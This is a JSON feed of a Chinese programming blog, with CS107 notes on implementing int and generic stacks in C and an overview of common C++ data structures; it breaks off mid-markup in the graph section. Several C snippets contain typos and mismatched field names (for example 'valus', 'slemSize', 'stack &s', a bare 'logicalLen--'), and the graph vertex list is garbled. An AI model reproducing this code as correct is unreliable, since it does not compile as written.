{
    "version": "https://jsonfeed.org/version/1",
    "title": "亚纳奇的Blog • All posts by \"博客\" category",
    "description": "一个不知名的小菜鸡",
    "home_page_url": "http://Yanagi-Kon.github.io",
    "items": [
        {
            "id": "http://yanagi-kon.github.io/2023/11/06/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_6/",
            "url": "http://yanagi-kon.github.io/2023/11/06/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_6/",
            "title": "斯坦福编程范式CS107_6",
            "date_published": "2023-11-06T00:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_6\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_6\">#</a> 斯坦福编程范式 CS107_6</h1>\n<h2 id=\"实现一个整型的栈下\"><a class=\"markdownIt-Anchor\" href=\"#实现一个整型的栈下\">#</a> 实现一个整型的栈（下）</h2>\n<p>在 C 语言中结构体中的所有内容都是隐式的 public ，无法像 C++ 那样，实现 private protect 之类的限定词进行限制，但是我们可以假装里面的内容是不可见的，并要求通过我们定义的函数对其中的内容进行操作。</p>\n<p>下面内容在  <code>stack.h</code>  文件中</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>elems<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> logicalLen<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 已经使用的内存</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> alloclength<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 申请的内存大小</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span>stack<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上节课实现的 New 以及我们接下来要实现的其他函数，他们都在  <code>stack.c</code>  文件中</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    s<span class=\"token operator\">-></span>logicallen <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    s<span class=\"token operator\">-></span>allocLen <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token operator\">-></span>elems <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 动态分配内存函数，返回这一大块内存地址的开始地址</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 如果 assert 里面的内容为 false，assert 会终止程序，并告知终止位置</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面是 Dispose 的实现</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>有人可能会问，能否直接使用  <code>free(s)</code>  实现直接对栈进行释放内存？答案是不可以，因为除了在 New 函数中，其他任何地方对这个栈变量分配空间。 <code>free(s)</code>  这样操作的假设是 s 栈空间已经被分配好，并将它被 New 函数所指定的地址作为参数传递给 Dispose。</p>\n<p>下面是 Push 的实现</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>logicalLen <span class=\"token operator\">==</span> s<span class=\"token operator\">-></span>alloclength<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        s<span class=\"token operator\">-></span>alloclength <span class=\"token operator\">*=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        s<span class=\"token operator\">-></span>elems <span class=\"token operator\">=</span> <span class=\"token function\">realloc</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">,</span>s<span class=\"token operator\">-></span>alloclength <span class=\"token operator\">*</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\">//realloc 首先假设第一个参数指向了一个动态申请的内存块，随后将其调整成第二个参数大小，如果可以调整，则返回第一个\t\t// 参数原先的地址，否则就使用 alloc 另开一块地址，返回新的地址</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">[</span>s<span class=\"token operator\">-></span>logicalLen<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>valus<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    s<span class=\"token operator\">-></span>logicalLen <span class=\"token operator\">++</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面是 Pop 的实现</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>logicalLen <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    logicalLen<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">[</span>s<span class=\"token operator\">-></span>logicalLen<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"实现上述类型的通用模板\"><a class=\"markdownIt-Anchor\" href=\"#实现上述类型的通用模板\">#</a> 实现上述类型的通用模板</h2>\n<h3 id=\"stackh\"><a class=\"markdownIt-Anchor\" href=\"#stackh\">#</a> stack.h</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elems<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 泛型中并不知道类型占用字节的大小，所以需要指定</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> loglength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> alloclength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span>stack<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"stackc\"><a class=\"markdownIt-Anchor\" href=\"#stackc\">#</a> stack.c</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>elemSize <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    s<span class=\"token operator\">-></span>elemSize <span class=\"token operator\">=</span> elemSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token operator\">-></span>loglength <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    s<span class=\"token operator\">-></span>alloclength <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    s<span class=\"token operator\">-></span>elems <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span>elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>loglength <span class=\"token operator\">==</span> s<span class=\"token operator\">-></span>alloclength<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token function\">StackGrow</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 这里添加了一个辅助函数用于进行内存空间拓展</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>target <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">+</span> s<span class=\"token operator\">-></span>loglength <span class=\"token operator\">*</span>s<span class=\"token operator\">-></span>elemSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span>elemAddr<span class=\"token punctuation\">,</span>s<span class=\"token operator\">-></span>elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    s<span class=\"token operator\">-></span>loglength<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当 <code>static</code>  修饰 c 或者 c<ins> 的函数原型时，这意味着，这是一个私有函数，不应该在函数所在文件之外的地方对其引用，因此在大多数情况下，它和 C</ins> 中的 private 有着相同的含义。其他的函数诸如我们上面写的 New、Disopose、Push 等都是全局函数，可以被其他的 <code>.o</code>  文件所使用</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">StackGrow</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    s<span class=\"token operator\">-></span>alloclength <span class=\"token operator\">*=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    s<span class=\"token operator\">-></span>elems <span class=\"token operator\">=</span> <span class=\"token function\">realloc</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">,</span>s<span class=\"token operator\">-></span>alloclength <span class=\"token operator\">*</span> s<span class=\"token operator\">-></span>slemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>source <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>loglength <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> s<span class=\"token operator\">-></span>elemSize<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>elemAddr<span class=\"token punctuation\">,</span>source<span class=\"token punctuation\">,</span>s<span class=\"token operator\">-></span>elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token operator\">-></span>loglength<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/05/C++%20%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/",
            "url": "http://yanagi-kon.github.io/2023/11/05/C++%20%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/",
            "title": "C++ 常见的数据结构",
            "date_published": "2023-11-05T12:28:00.000Z",
            "content_html": "<h1 id=\"c-常见的数据结构\"><a class=\"markdownIt-Anchor\" href=\"#c-常见的数据结构\">#</a> C++ 常见的数据结构</h1>\n<h2 id=\"数组\"><a class=\"markdownIt-Anchor\" href=\"#数组\">#</a> 数组</h2>\n<p>数组是将相同类型的元素存储于连续内存空间的数据结构，其长度不可变。</p>\n<p>如下图所示，构建此数组需要在初始化时给定长度，并对数组每个索引元素赋值，代码如下：</p>\n<pre><code class=\"language-c++\">// 初始化一个长度为 5 的数组 array\nint array[5];\n// 元素赋值\narray[0] = 2;\narray[1] = 3;\narray[2] = 1;\narray[3] = 0;\narray[4] = 2;\n</code></pre>\n<p>或者可以使用直接赋值的初始化方式，代码如下：</p>\n<pre><code class=\"language-c++\">int array[] = &#123;2, 3, 1, 0, 2&#125;;\n</code></pre>\n<p>「可变数组」是经常使用的数据结构，其基于数组和扩容机制实现，相比普通数组更加灵活。常用操作有：访问元素、添加元素、删除元素。</p>\n<pre><code class=\"language-c++\">// 初始化可变数组\nvector&lt;int&gt; array;\n\n// 向尾部添加元素\narray.push_back(2);\narray.push_back(3);\narray.push_back(1);\narray.push_back(0);\narray.push_back(2);\n</code></pre>\n<h2 id=\"链表\"><a class=\"markdownIt-Anchor\" href=\"#链表\">#</a> 链表</h2>\n<p>链表以节点为单位，每个元素都是一个独立对象，在内存空间的存储是非连续的。链表的节点对象具有两个成员变量：「值  <code>val</code> 」，「后继节点引用  <code>next</code> 」 。</p>\n<pre><code class=\"language-c++\">struct ListNode &#123;\n    int val;        // 节点值\n    ListNode *next; // 后继节点引用\n    ListNode(int x) : val(x), next(NULL) &#123;&#125;\n&#125;;\n</code></pre>\n<p>如下图所示，建立此链表需要实例化每个节点，并构建各节点的引用指向。</p>\n<pre><code class=\"language-c++\">// 实例化节点\nListNode *n1 = new ListNode(4); // 节点 head\nListNode *n2 = new ListNode(5);\nListNode *n3 = new ListNode(1);\n\n// 构建引用指向\nn1-&gt;next = n2;\nn2-&gt;next = n3;\n</code></pre>\n<h2 id=\"栈\"><a class=\"markdownIt-Anchor\" href=\"#栈\">#</a> 栈</h2>\n<p>栈是一种具有 「先入后出」 特点的抽象数据结构，可使用数组或链表实现。</p>\n<pre><code class=\"language-c++\">stack&lt;int&gt; stk;\n</code></pre>\n<p>如下图所示，通过常用操作「入栈  <code>push()</code> 」,「出栈  <code>pop()</code> 」，展示了栈的先入后出特性。</p>\n<pre><code class=\"language-c++\">stk.push(1); // 元素 1 入栈\nstk.push(2); // 元素 2 入栈\nstk.pop();   // 出栈 -&gt; 元素 2\nstk.pop();   // 出栈 -&gt; 元素 1\n</code></pre>\n<h2 id=\"队列\"><a class=\"markdownIt-Anchor\" href=\"#队列\">#</a> 队列</h2>\n<p>队列是一种具有 「先入先出」 特点的抽象数据结构，可使用链表实现。</p>\n<pre><code class=\"language-c++\">queue&lt;int&gt; que;\n</code></pre>\n<p>如下图所示，通过常用操作「入队  <code>push()</code> 」,「出队  <code>pop()</code> 」，展示了队列的先入先出特性。</p>\n<pre><code class=\"language-c++\">que.push(1); // 元素 1 入队\nque.push(2); // 元素 2 入队\nque.pop();   // 出队 -&gt; 元素 1\nque.pop();   // 出队 -&gt; 元素 2\n</code></pre>\n<h2 id=\"树\"><a class=\"markdownIt-Anchor\" href=\"#树\">#</a> 树</h2>\n<p>树是一种非线性数据结构，根据子节点数量可分为 「二叉树」 和 「多叉树」，最顶层的节点称为「根节点 root」。以二叉树为例，每个节点包含三个成员变量：「值 val」、「左子节点 left」、「右子节点 right」 。</p>\n<pre><code class=\"language-c++\">struct TreeNode &#123;\n    int val;         // 节点值\n    TreeNode *left;  // 左子节点\n    TreeNode *right; // 右子节点\n    TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;\n&#125;;\n</code></pre>\n<p>如下图所示，建立此二叉树需要实例化每个节点，并构建各节点的引用指向。</p>\n<pre><code class=\"language-c++\">// 初始化节点\nTreeNode *n1 = new TreeNode(3); // 根节点 root\nTreeNode *n2 = new TreeNode(4);\nTreeNode *n3 = new TreeNode(5);\nTreeNode *n4 = new TreeNode(1);\nTreeNode *n5 = new TreeNode(2);\n\n// 构建引用指向\nn1-&gt;left = n2;\nn1-&gt;right = n3;\nn2-&gt;left = n4;\nn2-&gt;right = n5;\n</code></pre>\n<h2 id=\"图\"><a class=\"markdownIt-Anchor\" href=\"#图\">#</a> 图</h2>\n<p>图是一种非线性数据结构，由「节点（顶点）vertex」和「边 edge」组成，每条边连接一对顶点。根据边的方向有无，图可分为「有向图」和「无向图」。本文 以无向图为例 开展介绍。</p>\n<p>如下图所示，此无向图的 顶点 和 边 集合分别为：</p>\n<ul>\n<li 5 1, 2, 3, 4,>\n<p>顶点集合： vertices =</p>\n</li>\n<li>\n<p>边集合： edges = {(1, 2), (1, 3), (1, 4), (1, 5), (2, 4), (3, 5), (4, 5)</p>\n</li>\n</ul>\n<p>![Picture7.png](C++ 常见的数据结构 / 1599579136-Fxseew-Picture7.png)</p>\n<p>表示图的方法通常有两种：</p>\n<ol>\n<li>\n<p><strong>邻接矩阵：</strong> 使用数组  <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>c</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">vertices</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span></span></span></span> 存储顶点，邻接矩阵 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">edges</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span></span></span></span> 存储边；<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">[</mo><mi>i</mi><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">[</mo><mi>j</mi><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">edges[i][j]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">]</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mclose\">]</span></span></span></span> 代表节点 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[i+1]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">]</span></span></span></span> 和节点 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mi>j</mi><mo>+</mo><mn>1</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[j+1]</annotation></semantics></math></span><span 